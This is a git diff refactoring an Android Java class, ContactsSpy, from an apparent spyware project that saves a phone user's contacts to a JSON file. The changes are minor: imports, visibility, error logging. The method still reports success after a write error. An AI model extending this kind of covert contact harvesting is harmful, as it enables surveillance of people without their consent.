@@ -4,20 +4,23 @@ import android.content.ContentResolver;
 import android.content.Context;
 import android.database.Cursor;
 import android.provider.ContactsContract;
+import com.gameofcoding.spy.utils.XLog;
+import java.io.File;
 import java.io.FileWriter;
 import java.io.IOException;
 import org.json.JSONArray;
 import org.json.JSONException;
 import org.json.JSONObject;
-import com.gameofcoding.spy.utils.XLog;
-import java.io.File;
 
+/**
+ * Stores contacts of user
+*/
 public class ContactsSpy implements Spy {
     private final String TAG = "ContactsSpy";
     public static final String CONTACTS_FILE_NAME = "contacts.json";
+    private final JSONArray contacts = new JSONArray();
     private Context mContext;
     private File mDestFile;
-    private final JSONArray contacts = new JSONArray();
 
     public ContactsSpy(Context context, File destFile) {
 	mContext = context;
@@ -69,10 +72,11 @@ public class ContactsSpy implements Spy {
 	    contCursor.close();
 	
 	// Save contacts
-	saveContacts(mDestFile);
+	if(!saveContacts(mDestFile))
+	    XLog.e(TAG, "Unable to save contacts, mDestFile " + mDestFile);
     }
 
-    public boolean saveContacts(File contactsFile) {
+    private boolean saveContacts(File contactsFile) {
 	if(contactsFile.isDirectory()) {
 	    XLog.w(TAG, "saveContacts(File): contacts file '" + contactsFile + "' is a directory");
 	    return false;
@@ -80,10 +84,9 @@ public class ContactsSpy implements Spy {
 	try {
 	    FileWriter fw = new FileWriter(contactsFile);
 	    fw.write(contacts.toString());
-	    fw.flush();
 	    fw.close();
 	} catch(IOException e) {
-	    XLog.e(TAG, "saveContacts(File): Error occurred while saving contacts.", e);
+	    XLog.e(TAG, "saveContacts(File): Error occurred while saving contacts", e);
 	}
 	return true;
     }
